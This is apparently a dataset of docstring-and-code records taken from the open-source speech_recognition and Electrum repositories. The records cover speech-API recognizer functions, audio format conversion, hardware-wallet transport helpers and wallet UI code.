{"docstring": "\"\"\"\nPerforms speech recognition on ``audio_data`` (an ``AudioData`` instance), using the Google Cloud Speech API.\n\nThis function requires a Google Cloud Platform account; see the `Google Cloud Speech API Quickstart <https://cloud.google.com/speech/docs/getting-started>`__ for details and instructions. Basically, create a project, enable billing for the project, enable the Google Cloud Speech API for the project, and set up Service Account Key credentials for the project. The result is a JSON file containing the API credentials. The text content of this JSON file is specified by ``credentials_json``. If not specified, the library will try to automatically `find the default API credentials JSON file <https://developers.google.com/identity/protocols/application-default-credentials>`__.\n\nThe recognition language is determined by ``language``, which is a BCP-47 language tag like ``\"en-US\"`` (US English). A list of supported language tags can be found in the `Google Cloud Speech API documentation <https://cloud.google.com/speech/docs/languages>`__.\n\nIf ``preferred_phrases`` is an iterable of phrase strings, those given phrases will be more likely to be recognized over similar-sounding alternatives. This is useful for things like keyword/command recognition or adding new phrases that aren't in Google's vocabulary. Note that the API imposes certain `restrictions on the list of phrase strings <https://cloud.google.com/speech/limits#content>`__.\n\nReturns the most likely transcription if ``show_all`` is False (the default). Otherwise, returns the raw API response as a JSON dictionary.\n\nRaises a ``speech_recognition.UnknownValueError`` exception if the speech is unintelligible. Raises a ``speech_recognition.RequestError`` exception if the speech recognition operation failed, if the credentials aren't valid, or if there is no Internet connection.\n\"\"\"\n", "func_signal": "def recognize_google_cloud(self, audio_data, credentials_json=None, language=\"en-US\", preferred_phrases=None, show_all=False):\n", "code": "assert isinstance(audio_data, AudioData), \"``audio_data`` must be audio data\"\nif credentials_json is None:\n    assert os.environ.get('GOOGLE_APPLICATION_CREDENTIALS') is not None\nassert isinstance(language, str), \"``language`` must be a string\"\nassert preferred_phrases is None or all(isinstance(preferred_phrases, (type(\"\"), type(u\"\"))) for preferred_phrases in preferred_phrases), \"``preferred_phrases`` must be a list of strings\"\n\ntry:\n    import socket\n    from google.cloud import speech\n    from google.cloud.speech import enums\n    from google.cloud.speech import types\n    from google.api_core.exceptions import GoogleAPICallError\nexcept ImportError:\n    raise RequestError('missing google-cloud-speech module: ensure that google-cloud-speech is set up correctly.')\n\nif credentials_json is not None:\n    client = speech.SpeechClient.from_service_account_json(credentials_json)\nelse:\n    client = speech.SpeechClient()\n\nflac_data = audio_data.get_flac_data(\n    convert_rate=None if 8000 <= audio_data.sample_rate <= 48000 else max(8000, min(audio_data.sample_rate, 48000)),  # audio sample rate must be between 8 kHz and 48 kHz inclusive - clamp sample rate into this range\n    convert_width=2  # audio samples must be 16-bit\n)\naudio = types.RecognitionAudio(content=flac_data)\n\nconfig = {\n    'encoding': enums.RecognitionConfig.AudioEncoding.FLAC,\n    'sample_rate_hertz': audio_data.sample_rate,\n    'language_code': language\n}\nif preferred_phrases is not None:\n    config['speechContexts'] = [types.SpeechContext(\n        phrases=preferred_phrases\n    )]\nif show_all:\n    config['enableWordTimeOffsets'] = True  # some useful extra options for when we want all the output\n\nopts = {}\nif self.operation_timeout and socket.getdefaulttimeout() is None:\n    opts['timeout'] = self.operation_timeout\n\nconfig = types.RecognitionConfig(**config)\n\ntry:\n    response = client.recognize(config, audio, **opts)\nexcept GoogleAPICallError as e:\n    raise RequestError(e)\nexcept URLError as e:\n    raise RequestError(\"recognition connection failed: {0}\".format(e.reason))\n\nif show_all: return response\nif len(response.results) == 0: raise UnknownValueError()\n\ntranscript = ''\nfor result in response.results:\n    transcript += result.alternatives[0].transcript.strip() + ' '\nreturn transcript", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nSpawns a thread to repeatedly record phrases from ``source`` (an ``AudioSource`` instance) into an ``AudioData`` instance and call ``callback`` with that ``AudioData`` instance as soon as each phrase are detected.\n\nReturns a function object that, when called, requests that the background listener thread stop. The background thread is a daemon and will not stop the program from exiting if there are no other non-daemon threads. The function accepts one parameter, ``wait_for_stop``: if truthy, the function will wait for the background listener to stop before returning, otherwise it will return immediately and the background listener thread might still be running for a second or two afterwards. Additionally, if you are using a truthy value for ``wait_for_stop``, you must call the function from the same thread you originally called ``listen_in_background`` from.\n\nPhrase recognition uses the exact same mechanism as ``recognizer_instance.listen(source)``. The ``phrase_time_limit`` parameter works in the same way as the ``phrase_time_limit`` parameter for ``recognizer_instance.listen(source)``, as well.\n\nThe ``callback`` parameter is a function that should accept two parameters - the ``recognizer_instance``, and an ``AudioData`` instance representing the captured audio. Note that ``callback`` function will be called from a non-main thread.\n\"\"\"\n", "func_signal": "def listen_in_background(self, source, callback, phrase_time_limit=None):\n", "code": "assert isinstance(source, AudioSource), \"Source must be an audio source\"\nrunning = [True]\n\ndef threaded_listen():\n    with source as s:\n        while running[0]:\n            try:  # listen for 1 second, then check again if the stop function has been called\n                audio = self.listen(s, 1, phrase_time_limit)\n            except WaitTimeoutError:  # listening timed out, just try again\n                pass\n            else:\n                if running[0]: callback(self, audio)\n\ndef stopper(wait_for_stop=True):\n    running[0] = False\n    if wait_for_stop:\n        listener_thread.join()  # block until the background thread is done, which can take around 1 second\n\nlistener_thread = threading.Thread(target=threaded_listen)\nlistener_thread.daemon = True\nlistener_thread.start()\nreturn stopper", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"Python 2 compatibility: backport of ``shutil.which()`` from Python 3\"\"\"\n", "func_signal": "def shutil_which(pgm):\n", "code": "path = os.getenv('PATH')\nfor p in path.split(os.path.pathsep):\n    p = os.path.join(p, pgm)\n    if os.path.exists(p) and os.access(p, os.X_OK):\n        return p", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nCreates a new ``Recognizer`` instance, which represents a collection of speech recognition functionality.\n\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "self.energy_threshold = 300  # minimum audio energy to consider for recording\nself.dynamic_energy_threshold = True\nself.dynamic_energy_adjustment_damping = 0.15\nself.dynamic_energy_ratio = 1.5\nself.pause_threshold = 0.8  # seconds of non-speaking audio before a phrase is considered complete\nself.operation_timeout = None  # seconds after an internal operation (e.g., an API request) starts before it times out, or ``None`` for no timeout\n\nself.phrase_threshold = 0.3  # minimum seconds of speaking audio before we consider the speaking audio a phrase - values below this are ignored (for filtering out clicks and pops)\nself.non_speaking_duration = 0.5  # seconds of non-speaking audio to keep on both sides of the recording", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nReturns a byte string representing the contents of an AIFF-C file containing the audio represented by the ``AudioData`` instance.\n\nIf ``convert_width`` is specified and the audio samples are not ``convert_width`` bytes each, the resulting audio is converted to match.\n\nIf ``convert_rate`` is specified and the audio sample rate is not ``convert_rate`` Hz, the resulting audio is resampled to match.\n\nWriting these bytes directly to a file results in a valid `AIFF-C file <https://en.wikipedia.org/wiki/Audio_Interchange_File_Format>`__.\n\"\"\"\n", "func_signal": "def get_aiff_data(self, convert_rate=None, convert_width=None):\n", "code": "raw_data = self.get_raw_data(convert_rate, convert_width)\nsample_rate = self.sample_rate if convert_rate is None else convert_rate\nsample_width = self.sample_width if convert_width is None else convert_width\n\n# the AIFF format is big-endian, so we need to convert the little-endian raw data to big-endian\nif hasattr(audioop, \"byteswap\"):  # ``audioop.byteswap`` was only added in Python 3.4\n    raw_data = audioop.byteswap(raw_data, sample_width)\nelse:  # manually reverse the bytes of each sample, which is slower but works well enough as a fallback\n    raw_data = raw_data[sample_width - 1::-1] + b\"\".join(raw_data[i + sample_width:i:-1] for i in range(sample_width - 1, len(raw_data), sample_width))\n\n# generate the AIFF-C file contents\nwith io.BytesIO() as aiff_file:\n    aiff_writer = aifc.open(aiff_file, \"wb\")\n    try:  # note that we can't use context manager, since that was only added in Python 3.4\n        aiff_writer.setframerate(sample_rate)\n        aiff_writer.setsampwidth(sample_width)\n        aiff_writer.setnchannels(1)\n        aiff_writer.writeframes(raw_data)\n        aiff_data = aiff_file.getvalue()\n    finally:  # make sure resources are cleaned up\n        aiff_writer.close()\nreturn aiff_data", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nPerforms speech recognition on ``audio_data`` (an ``AudioData`` instance), using the Microsoft Bing Speech API.\n\nThe Microsoft Bing Speech API key is specified by ``key``. Unfortunately, these are not available without `signing up for an account <https://azure.microsoft.com/en-ca/pricing/details/cognitive-services/speech-api/>`__ with Microsoft Azure.\n\nTo get the API key, go to the `Microsoft Azure Portal Resources <https://portal.azure.com/>`__ page, go to \"All Resources\" > \"Add\" > \"See All\" > Search \"Bing Speech API > \"Create\", and fill in the form to make a \"Bing Speech API\" resource. On the resulting page (which is also accessible from the \"All Resources\" page in the Azure Portal), go to the \"Show Access Keys\" page, which will have two API keys, either of which can be used for the `key` parameter. Microsoft Bing Speech API keys are 32-character lowercase hexadecimal strings.\n\nThe recognition language is determined by ``language``, a BCP-47 language tag like ``\"en-US\"`` (US English) or ``\"fr-FR\"`` (International French), defaulting to US English. A list of supported language values can be found in the `API documentation <https://docs.microsoft.com/en-us/azure/cognitive-services/speech/api-reference-rest/bingvoicerecognition#recognition-language>`__ under \"Interactive and dictation mode\".\n\nReturns the most likely transcription if ``show_all`` is false (the default). Otherwise, returns the `raw API response <https://docs.microsoft.com/en-us/azure/cognitive-services/speech/api-reference-rest/bingvoicerecognition#sample-responses>`__ as a JSON dictionary.\n\nRaises a ``speech_recognition.UnknownValueError`` exception if the speech is unintelligible. Raises a ``speech_recognition.RequestError`` exception if the speech recognition operation failed, if the key isn't valid, or if there is no internet connection.\n\"\"\"\n", "func_signal": "def recognize_bing(self, audio_data, key, language=\"en-US\", show_all=False):\n", "code": "assert isinstance(audio_data, AudioData), \"Data must be audio data\"\nassert isinstance(key, str), \"``key`` must be a string\"\nassert isinstance(language, str), \"``language`` must be a string\"\n\naccess_token, expire_time = getattr(self, \"bing_cached_access_token\", None), getattr(self, \"bing_cached_access_token_expiry\", None)\nallow_caching = True\ntry:\n    from time import monotonic  # we need monotonic time to avoid being affected by system clock changes, but this is only available in Python 3.3+\nexcept ImportError:\n    try:\n        from monotonic import monotonic  # use time.monotonic backport for Python 2 if available (from https://pypi.python.org/pypi/monotonic)\n    except (ImportError, RuntimeError):\n        expire_time = None  # monotonic time not available, don't cache access tokens\n        allow_caching = False  # don't allow caching, since monotonic time isn't available\nif expire_time is None or monotonic() > expire_time:  # caching not enabled, first credential request, or the access token from the previous one expired\n    # get an access token using OAuth\n    credential_url = \"https://api.cognitive.microsoft.com/sts/v1.0/issueToken\"\n    credential_request = Request(credential_url, data=b\"\", headers={\n        \"Content-type\": \"application/x-www-form-urlencoded\",\n        \"Content-Length\": \"0\",\n        \"Ocp-Apim-Subscription-Key\": key,\n    })\n\n    if allow_caching:\n        start_time = monotonic()\n\n    try:\n        credential_response = urlopen(credential_request, timeout=60)  # credential response can take longer, use longer timeout instead of default one\n    except HTTPError as e:\n        raise RequestError(\"credential request failed: {}\".format(e.reason))\n    except URLError as e:\n        raise RequestError(\"credential connection failed: {}\".format(e.reason))\n    access_token = credential_response.read().decode(\"utf-8\")\n\n    if allow_caching:\n        # save the token for the duration it is valid for\n        self.bing_cached_access_token = access_token\n        self.bing_cached_access_token_expiry = start_time + 600  # according to https://docs.microsoft.com/en-us/azure/cognitive-services/speech/api-reference-rest/bingvoicerecognition, the token expires in exactly 10 minutes\n\nwav_data = audio_data.get_wav_data(\n    convert_rate=16000,  # audio samples must be 8kHz or 16 kHz\n    convert_width=2  # audio samples should be 16-bit\n)\n\nurl = \"https://speech.platform.bing.com/speech/recognition/interactive/cognitiveservices/v1?{}\".format(urlencode({\n    \"language\": language,\n    \"locale\": language,\n    \"requestid\": uuid.uuid4(),\n}))\n\nif sys.version_info >= (3, 6):  # chunked-transfer requests are only supported in the standard library as of Python 3.6+, use it if possible\n    request = Request(url, data=io.BytesIO(wav_data), headers={\n        \"Authorization\": \"Bearer {}\".format(access_token),\n        \"Content-type\": \"audio/wav; codec=\\\"audio/pcm\\\"; samplerate=16000\",\n        \"Transfer-Encoding\": \"chunked\",\n    })\nelse:  # fall back on manually formatting the POST body as a chunked request\n    ascii_hex_data_length = \"{:X}\".format(len(wav_data)).encode(\"utf-8\")\n    chunked_transfer_encoding_data = ascii_hex_data_length + b\"\\r\\n\" + wav_data + b\"\\r\\n0\\r\\n\\r\\n\"\n    request = Request(url, data=chunked_transfer_encoding_data, headers={\n        \"Authorization\": \"Bearer {}\".format(access_token),\n        \"Content-type\": \"audio/wav; codec=\\\"audio/pcm\\\"; samplerate=16000\",\n        \"Transfer-Encoding\": \"chunked\",\n    })\n\ntry:\n    response = urlopen(request, timeout=self.operation_timeout)\nexcept HTTPError as e:\n    raise RequestError(\"recognition request failed: {}\".format(e.reason))\nexcept URLError as e:\n    raise RequestError(\"recognition connection failed: {}\".format(e.reason))\nresponse_text = response.read().decode(\"utf-8\")\nresult = json.loads(response_text)\n\n# return results\nif show_all: return result\nif \"RecognitionStatus\" not in result or result[\"RecognitionStatus\"] != \"Success\" or \"DisplayText\" not in result: raise UnknownValueError()\nreturn result[\"DisplayText\"]", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nPerforms speech recognition on ``audio_data`` (an ``AudioData`` instance).\n\nPath to Tensor loaded from ``tensor_graph``. You can download a model here: http://download.tensorflow.org/models/speech_commands_v0.01.zip\n\nPath to Tensor Labels file loaded from ``tensor_label``.\n\"\"\"\n", "func_signal": "def recognize_tensorflow(self, audio_data, tensor_graph='tensorflow-data/conv_actions_frozen.pb', tensor_label='tensorflow-data/conv_actions_labels.txt'):\n", "code": "assert isinstance(audio_data, AudioData), \"Data must be audio data\"\nassert isinstance(tensor_graph, str), \"``tensor_graph`` must be a string\"\nassert isinstance(tensor_label, str), \"``tensor_label`` must be a string\"\n\ntry:\n    import tensorflow as tf\nexcept ImportError:\n    raise RequestError(\"missing tensorflow module: ensure that tensorflow is set up correctly.\")\n\nif not (tensor_graph == self.lasttfgraph):\n    self.lasttfgraph = tensor_graph\n\n    # load graph\n    with tf.gfile.FastGFile(tensor_graph, 'rb') as f:\n        graph_def = tf.GraphDef()\n        graph_def.ParseFromString(f.read())\n        tf.import_graph_def(graph_def, name='')\n    # load labels\n    self.tflabels = [line.rstrip() for line in tf.gfile.GFile(tensor_label)]\n\nwav_data = audio_data.get_wav_data(\n    convert_rate=16000, convert_width=2\n)\n\nwith tf.Session() as sess:\n    input_layer_name = 'wav_data:0'\n    output_layer_name = 'labels_softmax:0'\n    softmax_tensor = sess.graph.get_tensor_by_name(output_layer_name)\n    predictions, = sess.run(softmax_tensor, {input_layer_name: wav_data})\n\n    # Sort labels in order of confidence\n    top_k = predictions.argsort()[-1:][::-1]\n    for node_id in top_k:\n        human_string = self.tflabels[node_id]\n        return human_string", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nReturns a new ``AudioData`` instance, trimmed to a given time interval. In other words, an ``AudioData`` instance with the same audio data except starting at ``start_ms`` milliseconds in and ending ``end_ms`` milliseconds in.\n\nIf not specified, ``start_ms`` defaults to the beginning of the audio, and ``end_ms`` defaults to the end.\n\"\"\"\n", "func_signal": "def get_segment(self, start_ms=None, end_ms=None):\n", "code": "assert start_ms is None or start_ms >= 0, \"``start_ms`` must be a non-negative number\"\nassert end_ms is None or end_ms >= (0 if start_ms is None else start_ms), \"``end_ms`` must be a non-negative number greater or equal to ``start_ms``\"\nif start_ms is None:\n    start_byte = 0\nelse:\n    start_byte = int((start_ms * self.sample_rate * self.sample_width) // 1000)\nif end_ms is None:\n    end_byte = len(self.frame_data)\nelse:\n    end_byte = int((end_ms * self.sample_rate * self.sample_width) // 1000)\nreturn AudioData(self.frame_data[start_byte:end_byte], self.sample_rate, self.sample_width)", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nReturns a list of the names of all available microphones. For microphones where the name can't be retrieved, the list entry contains ``None`` instead.\n\nThe index of each microphone's name in the returned list is the same as its device index when creating a ``Microphone`` instance - if you want to use the microphone at index 3 in the returned list, use ``Microphone(device_index=3)``.\n\"\"\"\n", "func_signal": "def list_microphone_names():\n", "code": "audio = Microphone.get_pyaudio().PyAudio()\ntry:\n    result = []\n    for i in range(audio.get_device_count()):\n        device_info = audio.get_device_info_by_index(i)\n        result.append(device_info.get(\"name\"))\nfinally:\n    audio.terminate()\nreturn result", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nPerforms speech recognition on ``audio_data`` (an ``AudioData`` instance), using the IBM Speech to Text API.\n\nThe IBM Speech to Text username and password are specified by ``username`` and ``password``, respectively. Unfortunately, these are not available without `signing up for an account <https://console.ng.bluemix.net/registration/>`__. Once logged into the Bluemix console, follow the instructions for `creating an IBM Watson service instance <https://www.ibm.com/watson/developercloud/doc/getting_started/gs-credentials.shtml>`__, where the Watson service is \"Speech To Text\". IBM Speech to Text usernames are strings of the form XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX, while passwords are mixed-case alphanumeric strings.\n\nThe recognition language is determined by ``language``, an RFC5646 language tag with a dialect like ``\"en-US\"`` (US English) or ``\"zh-CN\"`` (Mandarin Chinese), defaulting to US English. The supported language values are listed under the ``model`` parameter of the `audio recognition API documentation <https://www.ibm.com/watson/developercloud/speech-to-text/api/v1/#sessionless_methods>`__, in the form ``LANGUAGE_BroadbandModel``, where ``LANGUAGE`` is the language value.\n\nReturns the most likely transcription if ``show_all`` is false (the default). Otherwise, returns the `raw API response <https://www.ibm.com/watson/developercloud/speech-to-text/api/v1/#sessionless_methods>`__ as a JSON dictionary.\n\nRaises a ``speech_recognition.UnknownValueError`` exception if the speech is unintelligible. Raises a ``speech_recognition.RequestError`` exception if the speech recognition operation failed, if the key isn't valid, or if there is no internet connection.\n\"\"\"\n", "func_signal": "def recognize_ibm(self, audio_data, username, password, language=\"en-US\", show_all=False):\n", "code": "assert isinstance(audio_data, AudioData), \"Data must be audio data\"\nassert isinstance(username, str), \"``username`` must be a string\"\nassert isinstance(password, str), \"``password`` must be a string\"\n\nflac_data = audio_data.get_flac_data(\n    convert_rate=None if audio_data.sample_rate >= 16000 else 16000,  # audio samples should be at least 16 kHz\n    convert_width=None if audio_data.sample_width >= 2 else 2  # audio samples should be at least 16-bit\n)\nurl = \"https://stream.watsonplatform.net/speech-to-text/api/v1/recognize?{}\".format(urlencode({\n    \"profanity_filter\": \"false\",\n    \"model\": \"{}_BroadbandModel\".format(language),\n    \"inactivity_timeout\": -1,  # don't stop recognizing when the audio stream activity stops\n}))\nrequest = Request(url, data=flac_data, headers={\n    \"Content-Type\": \"audio/x-flac\",\n    \"X-Watson-Learning-Opt-Out\": \"true\",  # prevent requests from being logged, for improved privacy\n})\nauthorization_value = base64.standard_b64encode(\"{}:{}\".format(username, password).encode(\"utf-8\")).decode(\"utf-8\")\nrequest.add_header(\"Authorization\", \"Basic {}\".format(authorization_value))\ntry:\n    response = urlopen(request, timeout=self.operation_timeout)\nexcept HTTPError as e:\n    raise RequestError(\"recognition request failed: {}\".format(e.reason))\nexcept URLError as e:\n    raise RequestError(\"recognition connection failed: {}\".format(e.reason))\nresponse_text = response.read().decode(\"utf-8\")\nresult = json.loads(response_text)\n\n# return results\nif show_all: return result\nif \"results\" not in result or len(result[\"results\"]) < 1 or \"alternatives\" not in result[\"results\"][0]:\n    raise UnknownValueError()\n\ntranscription = []\nfor utterance in result[\"results\"]:\n    if \"alternatives\" not in utterance: raise UnknownValueError()\n    for hypothesis in utterance[\"alternatives\"]:\n        if \"transcript\" in hypothesis:\n            transcription.append(hypothesis[\"transcript\"])\nreturn \"\\n\".join(transcription)", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "\"\"\"\nReturns a byte string representing the contents of a WAV file containing the audio represented by the ``AudioData`` instance.\n\nIf ``convert_width`` is specified and the audio samples are not ``convert_width`` bytes each, the resulting audio is converted to match.\n\nIf ``convert_rate`` is specified and the audio sample rate is not ``convert_rate`` Hz, the resulting audio is resampled to match.\n\nWriting these bytes directly to a file results in a valid `WAV file <https://en.wikipedia.org/wiki/WAV>`__.\n\"\"\"\n", "func_signal": "def get_wav_data(self, convert_rate=None, convert_width=None):\n", "code": "raw_data = self.get_raw_data(convert_rate, convert_width)\nsample_rate = self.sample_rate if convert_rate is None else convert_rate\nsample_width = self.sample_width if convert_width is None else convert_width\n\n# generate the WAV file contents\nwith io.BytesIO() as wav_file:\n    wav_writer = wave.open(wav_file, \"wb\")\n    try:  # note that we can't use context manager, since that was only added in Python 3.4\n        wav_writer.setframerate(sample_rate)\n        wav_writer.setsampwidth(sample_width)\n        wav_writer.setnchannels(1)\n        wav_writer.writeframes(raw_data)\n        wav_data = wav_file.getvalue()\n    finally:  # make sure resources are cleaned up\n        wav_writer.close()\nreturn wav_data", "path": "speech_recognition/speech_recognition/__init__.py", "commit_date": "2020-12-23 00:00:00", "repo_name": "Uberi/speech_recognition", "stars": 7927, "license": "bsd-3-clause", "language": "python", "size": 111052}
{"docstring": "# this overloads the wizard's method\n", "func_signal": "def create_keystore(self, wizard, seed, passphrase):\n", "code": "xprv1, xpub1, xprv2, xpub2 = self.xkeys_from_seed(seed, passphrase)\nk1 = keystore.from_xprv(xprv1)\nk2 = keystore.from_xpub(xpub2)\nwizard.request_password(run_next=lambda pw, encrypt: self.on_password(wizard, pw, encrypt, k1, k2))", "path": "electrum/electrum/plugins/trustedcoin/trustedcoin.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"Decode a PEM string into a bytearray of its payload.\n\nThe input must contain an appropriate PEM prefix and postfix\nbased on the input name string, e.g. for name=\"CERTIFICATE\":\n\n-----BEGIN CERTIFICATE-----\nMIIBXDCCAUSgAwIBAgIBADANBgkqhkiG9w0BAQUFADAPMQ0wCwYDVQQDEwRUQUNL\n...\nKoZIhvcNAQEFBQADAwA5kw==\n-----END CERTIFICATE-----    \n\nThe first such PEM block in the input will be found, and its\npayload will be base64 decoded and returned.\n\"\"\"\n", "func_signal": "def dePem(s, name):\n", "code": "prefix  = \"-----BEGIN %s-----\" % name\npostfix = \"-----END %s-----\" % name    \nstart = s.find(prefix)\nif start == -1:\n    raise SyntaxError(\"Missing PEM prefix\")\nend = s.find(postfix, start+len(prefix))\nif end == -1:\n    raise SyntaxError(\"Missing PEM postfix\")\ns = s[start+len(\"-----BEGIN %s-----\" % name) : end]\nretBytes = a2b_base64(s) # May raise SyntaxError\nreturn retBytes", "path": "electrum/electrum/pem.py", "commit_date": "2018-07-13 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"\nAttempt to authenticate for a particular cosigner.\n:param id: the id of the cosigner\n:param transaction: the hex encoded [partially signed] compact transaction to sign\n:param otp: the one time password\n\"\"\"\n", "func_signal": "def sign(self, id, transaction, otp):\n", "code": "payload = {\n    'otp': otp,\n    'transaction': transaction\n}\nreturn self.send_request('post', 'cosigner/%s/sign' % quote(id), payload,\n                         timeout=60)", "path": "electrum/electrum/plugins/trustedcoin/trustedcoin.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "# not calling maybe_defer_update() as it interferes with conditional-visibility\n", "func_signal": "def update(self):\n", "code": "self.proxy.setDynamicSortFilter(False)  # temp. disable re-sorting after every change\nself.std_model.clear()\nself.update_headers(self.__class__.headers)\nfor idx, item in enumerate(self.parent.wallet.get_invoices()):\n    if item.is_lightning():\n        key = item.rhash\n        icon_name = 'lightning.png'\n    else:\n        key = item.id\n        icon_name = 'bitcoin.png'\n        if item.bip70:\n            icon_name = 'seal.png'\n    status = self.parent.wallet.get_invoice_status(item)\n    status_str = item.get_status_str(status)\n    message = item.message\n    amount = item.get_amount_sat()\n    timestamp = item.time or 0\n    date_str = format_time(timestamp) if timestamp else _('Unknown')\n    amount_str = self.parent.format_amount(amount, whitespaces=True)\n    labels = [date_str, message, amount_str, status_str]\n    items = [QStandardItem(e) for e in labels]\n    self.set_editability(items)\n    items[self.Columns.DATE].setIcon(read_QIcon(icon_name))\n    items[self.Columns.STATUS].setIcon(read_QIcon(pr_icons.get(status)))\n    items[self.Columns.DATE].setData(key, role=ROLE_REQUEST_ID)\n    items[self.Columns.DATE].setData(item.type, role=ROLE_REQUEST_TYPE)\n    items[self.Columns.DATE].setData(timestamp, role=ROLE_SORT_ORDER)\n    self.std_model.insertRow(idx, items)\nself.filter()\nself.proxy.setDynamicSortFilter(True)\n# sort requests by date\nself.sortByColumn(self.Columns.DATE, Qt.DescendingOrder)\n# hide list if empty\nif self.parent.isVisible():\n    b = self.std_model.rowCount() > 0\n    self.setVisible(b)\n    self.parent.invoices_label.setVisible(b)", "path": "electrum/electrum/gui/qt/invoice_list.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "# Initialization method\n", "func_signal": "def initialize_device(self, device_id, wizard, handler):\n", "code": "msg = _(\"Choose how you want to initialize your {}.\").format(self.device, self.device)\nchoices = [\n    # Must be short as QT doesn't word-wrap radio button text\n    (TIM_NEW, _(\"Let the device generate a completely new seed randomly\")),\n    (TIM_RECOVER, _(\"Recover from a seed you have previously written down\")),\n]\ndef f(method):\n    import threading\n    settings = self.request_trezor_init_settings(wizard, method, device_id)\n    t = threading.Thread(target=self._initialize_device_safe, args=(settings, method, device_id, wizard, handler))\n    t.setDaemon(True)\n    t.start()\n    exit_code = wizard.loop.exec_()\n    if exit_code != 0:\n        # this method (initialize_device) was called with the expectation\n        # of leaving the device in an initialized state when finishing.\n        # signal that this is not the case:\n        raise UserCancelled()\nwizard.choice_dialog(title=_('Initialize Device'), message=msg, choices=choices, run_next=f)", "path": "electrum/electrum/plugins/trezor/trezor.py", "commit_date": "2020-09-08 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"Reimplemented safetlib.transport.all_transports so that we can\nenable/disable specific transports.\n\"\"\"\n# NOTE: the bridge and UDP transports are disabled as they are using\n# the same ports as trezor\n", "func_signal": "def all_transports():\n", "code": "try:\n    # only to detect safetlib version\n    from safetlib.transport import all_transports\nexcept ImportError:\n    # old safetlib. compat for safetlib < 0.9.2\n    transports = []\n    #try:\n    #    from safetlib.transport_bridge import BridgeTransport\n    #    transports.append(BridgeTransport)\n    #except BaseException:\n    #    pass\n    try:\n        from safetlib.transport_hid import HidTransport\n        transports.append(HidTransport)\n    except BaseException:\n        pass\n    #try:\n    #    from safetlib.transport_udp import UdpTransport\n    #    transports.append(UdpTransport)\n    #except BaseException:\n    #    pass\n    try:\n        from safetlib.transport_webusb import WebUsbTransport\n        transports.append(WebUsbTransport)\n    except BaseException:\n        pass\nelse:\n    # new safetlib.\n    transports = []\n    #try:\n    #    from safetlib.transport.bridge import BridgeTransport\n    #    transports.append(BridgeTransport)\n    #except BaseException:\n    #    pass\n    try:\n        from safetlib.transport.hid import HidTransport\n        transports.append(HidTransport)\n    except BaseException:\n        pass\n    #try:\n    #    from safetlib.transport.udp import UdpTransport\n    #    transports.append(UdpTransport)\n    #except BaseException:\n    #    pass\n    try:\n        from safetlib.transport.webusb import WebUsbTransport\n        transports.append(WebUsbTransport)\n    except BaseException:\n        pass\n    return transports\nreturn transports", "path": "electrum/electrum/plugins/safe_t/transport.py", "commit_date": "2019-05-02 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
{"docstring": "\"\"\"Reimplemented safetlib.transport.get_transport,\n(1) for old safetlib\n(2) to be able to disable specific transports\n(3) to call our own enumerate_devices that catches exceptions\n\"\"\"\n", "func_signal": "def get_transport(self, path=None):\n", "code": "if path is None:\n    try:\n        return self.enumerate_devices()[0]\n    except IndexError:\n        raise Exception(\"No Safe-T mini found\") from None\n\ndef match_prefix(a, b):\n    return a.startswith(b) or b.startswith(a)\ntransports = [t for t in self.all_transports() if match_prefix(path, t.PATH_PREFIX)]\nif transports:\n    return transports[0].find_by_path(path)\nraise Exception(\"Unknown path prefix '%s'\" % path)", "path": "electrum/electrum/plugins/safe_t/transport.py", "commit_date": "2019-05-02 00:00:00", "repo_name": "spesmilo/electrum", "stars": 6969, "license": "mit", "language": "python", "size": 59477}
